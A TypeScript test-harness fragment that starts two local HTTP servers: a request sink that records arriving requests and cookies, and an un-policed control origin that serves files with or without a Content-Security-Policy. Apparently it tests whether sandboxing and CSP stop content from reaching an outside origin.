// ─────────────────────────────────────────────────────────────────────────────
// The second origin: a request sink that records what ARRIVES.
// ─────────────────────────────────────────────────────────────────────────────

interface Hit {
  /** Request path, e.g. `/x/doc/img`. */
  path: string;
  method: string;
  /** Whatever cookie header the browser chose to send, if any. */
  cookie?: string;
}

interface Sink {
  origin: string;
  hits: Hit[];
  close: () => Promise<void>;
}

/**
 * Start the stand-in-for-the-internet origin.
 *
 * It answers everything 200 with a permissive CORS header, and records every
 * request — including WebSocket upgrades, which Node routes to the `upgrade`
 * event and NOT to the request handler. Missing that event is how a WebSocket
 * probe silently becomes "nothing arrived".
 */
async function startSink(): Promise<Sink> {
  const hits: Hit[] = [];
  const sockets = new Set<Socket>();

  const record = (req: IncomingMessage) => {
    hits.push({
      path: (req.url || '').split('?')[0],
      method: req.method || 'GET',
      cookie: req.headers.cookie,
    });
  };

  const server = createServer((req: IncomingMessage, res: ServerResponse) => {
    record(req);
    res.writeHead(200, {
      'Content-Type': 'text/plain',
      'Access-Control-Allow-Origin': '*',
      'Content-Length': '2',
    });
    res.end('ok');
  });
  server.on('upgrade', (req: IncomingMessage, socket: Socket) => {
    record(req);
    socket.destroy();
  });
  server.on('connection', (s: Socket) => {
    sockets.add(s);
    s.on('close', () => sockets.delete(s));
  });

  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const port = (server.address() as AddressInfo).port;

  return {
    origin: `http://127.0.0.1:${port}`,
    hits,
    close: () => closeServer(server, sockets),
  };
}

// ─────────────────────────────────────────────────────────────────────────────
// The control origin: the same bytes, with the isolation removed.
// ─────────────────────────────────────────────────────────────────────────────

interface ControlOrigin {
  origin: string;
  /**
   * Register a file the control origin will serve.
   *
   * `policy` is optional and is the whole reason this origin can carry the
   * proof-of-failure rows: the SAME bytes are served twice from the SAME
   * origin, differing ONLY in the Content-Security-Policy header, so any
   * difference in what reaches the sink is attributable to the policy string
   * and to nothing else.
   */
  put: (name: string, body: string, contentType: string, policy?: string) => void;
  close: () => Promise<void>;
}

/**
 * Start the un-policed origin used by every positive control.
 *
 * It mirrors the experiment's `server.py`: extension-independent explicit
 * types, `nosniff` always, `Content-Disposition: inline`, a readable probe
 * cookie, and NO Content-Security-Policy at all. The probe cookie is what makes
 * the cookie assertions non-vacuous — the experiment's `nosandbox` row read
 * back `omnipus_probe=SECRET`, and a control that could not read a cookie
 * either would prove nothing about the sandboxed case.
 */
async function startControlOrigin(): Promise<ControlOrigin> {
  const files = new Map<string, { body: string; contentType: string; policy?: string }>();

  const server = createServer((req: IncomingMessage, res: ServerResponse) => {
    const name = (req.url || '').split('?')[0].replace(/^\//, '');
    const file = files.get(name);
    if (!file) {
      res.writeHead(404, { 'Content-Type': 'text/plain', 'Content-Length': '9' });
      res.end('not found');
      return;
    }
    const buf = Buffer.from(file.body, 'utf-8');
    const headers: Record<string, string> = {
      'Content-Type': file.contentType,
      'X-Content-Type-Options': 'nosniff',
      'Content-Disposition': 'inline',
      'Content-Length': String(buf.length),
      'Set-Cookie': 'omnipus_probe=SECRET; Path=/; SameSite=Strict',
    };
    if (file.policy) headers['Content-Security-Policy'] = file.policy;
    res.writeHead(200, headers);
    res.end(buf);
  });

  const sockets = new Set<Socket>();
  server.on('connection', (s: Socket) => {
    sockets.add(s);
    s.on('close', () => sockets.delete(s));
  });

  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const port = (server.address() as AddressInfo).port;

  return {
    origin: `http://127.0.0.1:${port}`,
    put: (name, body, contentType, policy) => files.set(name, { body, contentType, policy }),
    close: () => closeServer(server, sockets),
  };
}

function closeServer(server: Server, sockets: Set<Socket>): Promise<void> {
  for (const s of sockets) s.destroy();
  return new Promise<void>((resolve) => server.close(() => resolve()));
}

